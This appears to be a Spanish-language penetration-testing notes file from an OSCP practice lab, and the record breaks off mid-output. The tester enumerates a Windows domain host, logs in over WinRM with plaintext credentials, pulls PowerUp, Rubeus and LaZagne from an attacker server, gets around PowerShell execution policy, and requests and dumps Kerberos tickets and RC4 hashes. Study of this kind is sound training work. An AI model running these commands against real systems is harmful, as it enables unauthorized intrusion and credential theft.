#### Paso 1: Enumeracion

* nmap

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# nmap -A -vv -p- -T4 -Pn -oX MS01.scan 192.168.55.206 --webxml
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 15:57 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:57
Completed Parallel DNS resolution of 1 host. at 15:57, 0.01s elapsed
Initiating SYN Stealth Scan at 15:57
Scanning 192.168.55.206 [65535 ports]
Discovered open port 3389/tcp on 192.168.55.206
Discovered open port 445/tcp on 192.168.55.206
Discovered open port 135/tcp on 192.168.55.206
Discovered open port 139/tcp on 192.168.55.206
SYN Stealth Scan Timing: About 7.88% done; ETC: 16:04 (0:06:02 remaining)
SYN Stealth Scan Timing: About 21.34% done; ETC: 16:02 (0:03:45 remaining)
SYN Stealth Scan Timing: About 33.31% done; ETC: 16:02 (0:03:02 remaining)
SYN Stealth Scan Timing: About 36.51% done; ETC: 16:03 (0:03:30 remaining)
SYN Stealth Scan Timing: About 45.12% done; ETC: 16:03 (0:03:04 remaining)
SYN Stealth Scan Timing: About 59.01% done; ETC: 16:03 (0:02:06 remaining)
SYN Stealth Scan Timing: About 68.89% done; ETC: 16:03 (0:01:35 remaining)
Discovered open port 5985/tcp on 192.168.55.206
Completed SYN Stealth Scan at 16:02, 269.45s elapsed (65535 total ports)
Initiating Service scan at 16:02
Scanning 5 services on 192.168.55.206
Completed Service scan at 16:02, 17.19s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 192.168.55.206
Retrying OS detection (try #2) against 192.168.55.206
Initiating Traceroute at 16:02
Completed Traceroute at 16:02, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 16:02
Completed Parallel DNS resolution of 2 hosts. at 16:02, 0.02s elapsed
NSE: Script scanning 192.168.55.206.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:02
NSE Timing: About 99.86% done; ETC: 16:03 (0:00:00 remaining)
Completed NSE at 16:03, 40.59s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 2.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.01s elapsed
Nmap scan report for 192.168.55.206
Host is up, received user-set (0.16s latency).
Scanned at 2025-12-18 15:57:57 -03 for 337s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
| ssl-cert: Subject: commonName=WS26.oscp.exam
| Issuer: commonName=WS26.oscp.exam
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-17T18:22:02
| Not valid after:  2026-06-18T18:22:02
| MD5:   3515:25f8:648b:3def:7489:73e9:57b6:38ae
| SHA-1: 0a69:637b:09eb:573c:db80:e68c:cdab:92d3:cb34:d7dd
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQMt0Tbt/NCLNAYkwbG/jclDANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5XUzI2Lm9zY3AuZXhhbTAeFw0yNTEyMTcxODIyMDJaFw0yNjA2
| MTgxODIyMDJaMBkxFzAVBgNVBAMTDldTMjYub3NjcC5leGFtMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6J7By2tbAMLRY7HJVPfBa44vs95vLbI3YkKE
| Ffe8rwU0+/pRb/fuUUr1uMA49L0hrb/rwF4kmGf6m4Cd6PeVR31yuCx8+1RORzKX
| QCC+ujUijJ1an1XmhFMypbdVIfd/9EsRbvIRHVotYvQok3qDnCza7cV5mIg+OUE2
| bkNBdmFq+qxSEwbdpePCVH9nhwZwOtDboGP2MKxMuphx6jtH/ytLcpKAR8bfCc6H
| 1P3dFRjzBtrAp6uj1g5kXgNYUnQdkRWHZVrS8pBPrAi5oedoxGOZDhpLiEJSUAr9
| 7CNQOthE4NoT583U+jN+YmvJTjMzyXvYIx43fUsaTb9aa34EKQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAIV99oEkc+iCiFgTHPhHqpUB3Z5CnLbhMFGt9H+HkGorgJWOH2b5vMIVF/n3
| +Vka9SZnvURKuEjyELK0HI67hrbj+pI4+G4zwV7YaMSgWPVWmzYycpQYvSHjrQVl
| AzcuqfAMmfEFDoFsYr/pNokFp9qQ6YAa5cfZDuHJpKuq+m0eELSrpyPk3YBD+R39
| DGZqRe+cpWUoTG7Rre7XlNLfAK7MwrypX+IVIhN5htIRhrAFrkT7RKYos+hUcYsb
| U3BRgcqT2QBr16Bwif80jCl7cexGHk5p5LGJ3O7qvsRI476HNkPWPYdVDzAYl0pj
| lwjfwQ6Fo7DT4n8D7u+SxPKy3qk=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: WS26
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: WS26.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.22621
|_  System_Time: 2025-12-18T19:02:51+00:00
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.95%I=7%D=12/18%Time=69444FCE%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11|2008|7|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 11 21H2 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/18%OT=135%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69445006%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=A)
SEQ(SP=10A%GCD=1%ISR=109%TI=I%TS=A)
OPS(O1=M551NW8ST11%O2=M551NW8ST11%O3=M551NW8NNT11%O4=M551NW8ST11%O5=M551NW8ST11%O6=M551ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M551NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.040 days (since Thu Dec 18 15:06:05 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=266 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-18T19:02:55
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 4460/tcp): CLEAN (Timeout)
|   Check 2 (port 38402/tcp): CLEAN (Timeout)
|   Check 3 (port 32501/udp): CLEAN (Timeout)
|   Check 4 (port 14477/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1s, deviation: 0s, median: -2s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   160.05 ms 192.168.49.1
2   160.15 ms 192.168.55.206

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 340.48 seconds
           Raw packets sent: 131324 (5.782MB) | Rcvd: 205 (9.858KB)
```

* ldap

* smb

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# smbmap -H 192.168.55.206 -u r.andrews -p 'BusyOfficeWorker890'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Something weird happened on (192.168.55.206) Error occurs while reading from remote(104) on line 1015                                                                                                                                   
[*] Closed 1 connections
```

* Enumeracion Interna /evilwinrm

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# evil-winrm -i 192.168.55.206 -u 'r.andrews' -p 'BusyOfficeWorker890' -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\r.andrews\Documents> 

*Evil-WinRM* PS C:\> ipconfig
                                                                                                                                                                                                                                            
Windows IP Configuration                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Ethernet adapter Ethernet0:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
   Connection-specific DNS Suffix  . :                                                                                                                                                                                                      
   IPv4 Address. . . . . . . . . . . : 192.168.55.206                                                                                                                                                                                       
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                                                                                                                                                        
   Default Gateway . . . . . . . . . : 192.168.55.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.55.206
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
*Evil-WinRM* PS C:\> 

*Evil-WinRM* PS C:\Users\r.andrews\Documents> iwr -uri http://192.168.49.55:8000/PowerUp.ps1 -Outfile PowerUp.ps1
*Evil-WinRM* PS C:\Users\r.andrews\Documents> iwr -uri http://192.168.49.55:8000/PowerView.ps1 -Outfile PowerView.ps1
*Evil-WinRM* PS C:\Users\r.andrews\Documents> iwr -uri http://192.168.49.55:8000/Rubeus.exe -Outfile Rubeus.exe
*Evil-WinRM* PS C:\Users\r.andrews\Documents> iwr -uri http://192.168.49.55:8000/LaZagne.exe -Outfile LaZagne.exe
*Evil-WinRM* PS C:\Users\r.andrews\Documents> . .\PowerUp.ps1
File C:\Users\r.andrews\Documents\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.                     
At line:1 char:3                                                                                                                                                                                                                            
+ . .\PowerUp.ps1                                                                                                                                                                                                                           
+   ~~~~~~~~~~~~~                                                                                                                                                                                                                           
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException                                                                                                                                                                    
    + FullyQualifiedErrorId : UnauthorizedAccess                                                                                                                                                                                            
*Evil-WinRM* PS C:\Users\r.andrews\Documents> dir
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
    Directory: C:\Users\r.andrews\Documents                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Mode                 LastWriteTime         Length Name                                                                                                                                                                                      
----                 -------------         ------ ----                                                                                                                                                                                      
-a----        12/18/2025  11:48 AM       10136093 LaZagne.exe                                                                                                                                                                               
-a----        12/18/2025  11:43 AM         600580 PowerUp.ps1                                                                                                                                                                               
-a----        12/18/2025  11:46 AM         770279 PowerView.ps1                                                                                                                                                                             
-a----        12/18/2025  11:47 AM         446976 Rubeus.exe                                                                                                                                                                                
                                                                                                                                                                                                
*Evil-WinRM* PS C:\Users\r.andrews\Documents> powershell -ep bypass
Windows PowerShell                                                                                                                                                                                                                          
Copyright (C) Microsoft Corporation. All rights reserved.                                                                                                                                                                                   
                                                                                                                                                                                                                                            
Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows                                                                                                                                                   
                                                                                                                                                                                                                                            
PS C:\Users\r.andrews\Documents>                                                                                                                                                                                                            
*Evil-WinRM* PS C:\Users\r.andrews\Documents> . .\PowerUp.ps1
File C:\Users\r.andrews\Documents\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.                     
At line:1 char:3                                                                                                                                                                                                                            
+ . .\PowerUp.ps1
+   ~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Import-Module ./PowerUp.ps1
File C:\Users\r.andrews\Documents\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ Import-Module ./PowerUp.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Import-Module .\PowerUp.ps1
File C:\Users\r.andrews\Documents\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ Import-Module .\PowerUp.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Set-ExecutionPolicy RemoteSigned –Scope Process
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Import-Module .\PowerUp.ps1
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Invoke-AllChecks
Access denied                                                                                                                                                                                                                               
At C:\Users\r.andrews\Documents\PowerUp.ps1:2066 char:21                                                                                                                                                                                    
+     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...                                                                                                                                                                 
+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                                                                                                    
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException                                                                                                                                                    
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand                                                                                                                                   
Access denied                                                                                                                                                                                                                               
At C:\Users\r.andrews\Documents\PowerUp.ps1:2133 char:5                                                                                                                                                                                     
+     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...                                                                                                                                                                 
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                                                                                                                    
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException                                                                                                                                                    
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand                                                                                                                                   
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.                                                                                                                                         
At C:\Users\r.andrews\Documents\PowerUp.ps1:2189 char:5                                                                                                                                                                                     
+     Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeCo ...                                                                                                                                                                 
+     ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand


ModifiablePath    : C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps
IdentityReference : OSCP\r.andrews
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

*Evil-WinRM* PS C:\Users\r.andrews\Documents>
```

* Files

```bash

```

**Fase Agresiva**

* NTLM relay

1. Forzar autenticacion kerberos o NTLM en recurso compartido por nosotros

2. Obtener hash Responder

* kerberosting

* TGS/TGT 


```bash
*Evil-WinRM* PS C:\Users\r.andrews\Documents> .\Rubeus.exe asktgt /user:r.andrews /password:BusyOfficeWorker890 /oscp.exam:dc01.oscp.exam
                                                                                                                                                                                                                                            
   ______        _                                                                                                                                                                                                                          
  (_____ \      | |                                                                                                                                                                                                                         
   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                                                     
  |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                                                    
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                                                    
  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
  v2.2.0                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
[*] Action: Ask TGT                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
[*] Using rc4_hmac hash: 5883FE1B8F0912B3AE14D4115E6B77B4                                                                                                                                                                                   
[*] Building AS-REQ (w/ preauth) for: 'oscp.exam\r.andrews'                                                                                                                                                                                 
[*] Using domain controller: 172.16.55.200:88                                                                                                                                                                                               
[+] TGT request successful!                                                                                                                                                                                                                 
[*] base64(ticket.kirbi):                                                                                                                                                                                                                   
                                                                                                                                                                                                                                            
      doIFWjCCBVagAwIBBaEDAgEWooIEdzCCBHNhggRvMIIEa6ADAgEFoQsbCU9TQ1AuRVhBTaIeMBygAwIB                                                                                                                                                      
      AqEVMBMbBmtyYnRndBsJb3NjcC5leGFto4IENTCCBDGgAwIBEqEDAgECooIEIwSCBB/DauRonYUX0AYe                                                                                                                                                      
      HxDT3kpDZRAJ9aSYqGI0GloZgKweGmBaektfStLlt5n4NRnH+PBFIXQ9r1tfY0YIrbQkulNWirp5Fjo/                                                                                                                                                      
      YWQd/YXCjQa/J6iMSvdgK6f5TmVplgP+YE8V5owha5nP8CNFmXLx81EBDcQR0sbiGGTOmrDNiQWt5VG0                                                                                                                                                      
      BmYsOSpZFRXWaxdSsp8kxZy8QA4ut5k3PMfmrNX9cBLNRrJYZ54A2WbumC267t4Zz4oHpDolV0rH/FBM                                                                                                                                                      
      U5YXA88LBCeXxvPABQ9LZMIG89Z+oLB5yxpnxFWUVXhPhlk2ZGxkWcIk2l6NhjlpuV5oqHJ+Pe+Bs7Qd                                                                                                                                                      
      qD4BeSJW9wGxwjSOAUw/04dQi+pHCFFLN4ZF+SCEqVGx8q03vwXYfB7H7oYKlJyhlsWnAgFgkVz12bcM                                                                                                                                                      
      Vt+C9IA9jf2XFyXUZREK3jcpY36lF5/HFdNuj46vc/J13JfMFiURRlt+DYOiKJFgbHHfHPW/FBpjC0bH                                                                                                                                                      
      roqyMlFcy27wCV4CZ26MnmWl8gPuEGMsnOw/4mM+L+qT6U/BWL1L43P8B/gX5SGawOc4+VJWwmxFyKVp                                                                                                                                                      
      n/vDUXiUnbacf23WtIsWzFd6inA4W1Cd0MafyXPwju0fgeWfHlEHogksFGu0hA/GGjSunM5BBA17QgD+                                                                                                                                                      
      4XgBg/+XphEan/RG29IiAdCAVU3tfRobNAyL05dUZ8zk/1juVtaXGVTG2RqSmjoYjl+fFJZL+qQSckrs                                                                                                                                                      
      MxPaxmG/an+3WRGoBeHstFxsaNllHQoVzYW0Za1qvaEL0IAmOmBspj63DjCYxAM7IxWrXfOFhvBJSxVB                                                                                                                                                      
      8SLoBsFWVLq04TxcBpWVecRBnJbx4TnY39cFVVUQnOM90RYLsEPzLKbw6yyv32e7M2wk2/AcWxlyUpB1                                                                                                                                                      
      vElWlCZgBT9ZZHYkdSHGTQ6kCpgia7/srswsrevlhbZRzZ5NHF+bIN+ZFlFbUcG6+XTJx9OWvOQ+JcXx                                                                                                                                                      
      PpHldAKUwLD6bsCgyNq5WtuT4yS/Gblta+hFO/eQX3W9DWntzpELi/g63sMDxJHSXL06l5m5BT76+xG8                                                                                                                                                      
      rrq7hXMorzqhhesQ9S656o8Guy8nmZTzO06uDJ56Ow03ar8QGnFdh7UJU8NgN91KKX088CC1Ocq+IaKN                                                                                                                                                      
      3qxtHwTL82I+ij5eJC2N4EW4HbP3xVvfAkeLumA8umFPclTdsgLL2Worl0RCdAhdxWcjWWW2AZVGbM8V                                                                                                                                                      
      faYEDsV0y21QBQXhChel7UQ8JBNkrMjxAEs2Ey8ZtAqoOOjI4ssqiYe+WVJfb9p/oCke5Ug06Gupj2iz
      EdACsIrvDddOfyJKx833YOVjTS4RRP081Vui40m3FFaaMRJGo19da/y8gLfifj45Ib+fJ7ugcISb265n
      gS2B7HcD+jZeQaL8nK7LI+pd264S/q8OFKOBzjCBy6ADAgEAooHDBIHAfYG9MIG6oIG3MIG0MIGxoBsw
      GaADAgEXoRIEEEwwi0KJrQet0/cuzzHEzq6hCxsJT1NDUC5FWEFNohYwFKADAgEBoQ0wCxsJci5hbmRy
      ZXdzowcDBQBA4QAApREYDzIwMjUxMjE4MjAxMzEyWqYRGA8yMDI1MTIxOTA2MTMxMlqnERgPMjAyNTEy
      MjUyMDEzMTJaqAsbCU9TQ1AuRVhBTakeMBygAwIBAqEVMBMbBmtyYnRndBsJb3NjcC5leGFt

  ServiceName              :  krbtgt/oscp.exam
  ServiceRealm             :  OSCP.EXAM
  UserName                 :  r.andrews
  UserRealm                :  OSCP.EXAM
  StartTime                :  12/18/2025 12:13:12 PM
  EndTime                  :  12/18/2025 10:13:12 PM
  RenewTill                :  12/25/2025 12:13:12 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  TDCLQomtB63T9y7PMcTOrg==
  ASREP (key)              :  5883FE1B8F0912B3AE14D4115E6B77B4

*Evil-WinRM* PS C:\Users\r.andrews\Documents> klist
                                                                                                                                                                                                                                            
Current LogonId is 0:0x47acbd                                                                                                                                                                                                               
                                                                                                                                                                                                                                            
Cached Tickets: (1)                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
#0>     Client: r.andrews @ oscp.exam                                                                                                                                                                                                       
        Server: ws26$ @                                                                                                                                                                                                                     
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96                                                                                                                                                                                
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize                                                                                                                                                      
        Start Time: 12/18/2025 12:39:25 (local)                                                                                                                                                                                             
        End Time:   12/18/2025 12:54:25 (local)                                                                                                                                                                                             
        Renew Time: 12/25/2025 10:22:16 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x4 -> S4U
        Kdc Called: DC20.oscp.exam

*Evil-WinRM* PS C:\Users\r.andrews\Documents> .\Rubeus.exe dump /nowrap
                                                                                                                                                                                                                                            
   ______        _                                                                                                                                                                                                                          
  (_____ \      | |                                                                                                                                                                                                                         
   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                                                     
  |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                                                    
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                                                    
  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
  v2.2.0                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Action: Dump Kerberos Ticket Data (Current User)                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[*] Current LUID    : 0x47acbd                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[X] Error 1312 calling LsaCallAuthenticationPackage() for target "ws26$" : A specified logon session does not exist. It may already have been terminated                                                                                    
  UserName                 : r.andrews                                                                                                                                                                                                      
  Domain                   : OSCP                                                                                                                                                                                                           
  LogonId                  : 0x47acbd                                                                                                                                                                                                       
  UserSID                  : S-1-5-21-2481101513-2954867870-2660283483-1106                                                                                                                                                                 
  AuthenticationPackage    : NTLM                                                                                                                                                                                                           
  LogonType                : Network                                                                                                                                                                                                        
  LogonTime                : 12/18/2025 11:05:28 AM                                                                                                                                                                                         
  LogonServer              : DC20                                                                                                                                                                                                           
  LogonServerDNSDomain     : oscp.exam                                                                                                                                                                                                      
  UserPrincipalName        : r.andrews@oscp.exam  

*Evil-WinRM* PS C:\Users\r.andrews\Documents> .\Rubeus.exe dump /service:krbtgt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


Action: Dump Kerberos Ticket Data (Current User)

[*] Target service  : krbtgt
[*] Current LUID    : 0x47acbd

*Evil-WinRM* PS C:\Users\r.andrews\Documents> .\Rubeus.exe asktgt /user:r.andrews /rc4:5883FE1B8F0912B3AE14D4115E6B77B4

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 5883FE1B8F0912B3AE14D4115E6B77B4
[*] Building AS-REQ (w/ preauth) for: 'oscp.exam\r.andrews'
[*] Using domain controller: 172.16.55.200:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEdzCCBHNhggRvMIIEa6ADAgEFoQsbCU9TQ1AuRVhBTaIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJb3NjcC5leGFto4IENTCCBDGgAwIBEqEDAgECooIEIwSCBB9g8IqEd333cD2P
      xVzKtY+RdDHWqjuTcws5rteCngv5ltPQ7KfxZGA4iK2zP1p4BAunoEF5EP8e2ErwmQEb5bTZhd6iX3vH
      N5KaYkmS6f30tjyjJEoFhORCtO9G7/n7zowqkNxcfJiBdK793GnCFuFqWj06I3gdyxLPvrmF15cPvTuY
      vYxQ9VjKG/s42QeqnfE+iE+rW3/TGo/HGDP3VIG/OS2Y2QJvxvjcnsM+op4ejcwr3vGxVOJftkz/RcLt
      wJoBcbTdpO6/gN9RqwRQrX99QBI1o681IXQ0WeH66HmGxCKumqgaA9Gv/WI+0ripazj/1SXzP0Vib8t6
      hN0d0D1Zvf57CqdS5FMr2lyiaN4wqq9cLUDZzFIHCp439fKKxRX46XfskQgi3Zq4LWp2+9D8u2ogdZLv
      Dr4R8yPrqLv+vn+YXK86zoOifWyd46+a1Z3oOo8GowPfRx4URU+N+d9729HZD41+qe7UFKrhAPnAOL7g
      27vbBv6ZXdEdwKcMgEjGzbzsVOGGdlYxWBwYlm72Ns9Vdw0yTLmT4dFjyuYuNFLZvq0tfRd4h5SIDbu7
      RapD9xsL1+EhEd2M5iP16d8yUPQzhSjDNs/g3QL6Be+pfHovYmM04T+/w3qDH630GP94akEhxOyp2EsY
      A9KzxdGDJS2HT7jCDc/mf363/jTTZPrGeQbtm7G8F0yV2L14Xvupcx77lVi2lShUp8NOWUgsOq0u6yqV
